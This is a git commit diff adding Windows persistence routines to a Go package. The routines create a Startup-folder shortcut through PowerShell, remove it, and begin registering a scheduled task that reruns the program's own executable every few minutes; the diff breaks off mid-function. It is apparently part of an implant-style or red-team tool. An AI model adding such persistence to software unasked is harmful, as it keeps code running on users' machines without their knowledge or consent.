cefc1c8f804f4de38aa8bcbdf5183ff838d9f964
1rhino2 <noreply@github.com>
2025-10-26 20:47:00 -0400

    schtasks

--- pkg/persistence/persistence.go
+++ pkg/persistence/persistence.go
@@ -58,3 +58,33 @@ func (p *PersistenceHandler) InstallStartupFolder(name string) error {
 	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 	linkPath := filepath.Join(startupPath, name+".lnk")
 
+	cmd := exec.Command("powershell", "-Command",
+		fmt.Sprintf("$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%s'); $Shortcut.TargetPath = '%s'; $Shortcut.Save()",
+			linkPath, p.execPath))
+
+	return cmd.Run()
+}
+
+func (p *PersistenceHandler) RemoveStartupFolder(name string) error {
+	if runtime.GOOS != "windows" {
+		return fmt.Errorf("startup folder persistence only works on Windows")
+	}
+
+	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+	linkPath := filepath.Join(startupPath, name+".lnk")
+
+	return os.Remove(linkPath)
+}
+
+func (p *PersistenceHandler) InstallScheduledTask(name string, interval int) error {
+	if runtime.GOOS != "windows" {
+		return fmt.Errorf("scheduled task persistence only works on Windows")
+	}
+
+	cmd := exec.Command("schtasks", "/create",
+		"/tn", name,
+		"/tr", p.execPath,
+		"/sc", "minute",
+		"/mo", fmt.Sprintf("%d", interval),
+		"/f")
+
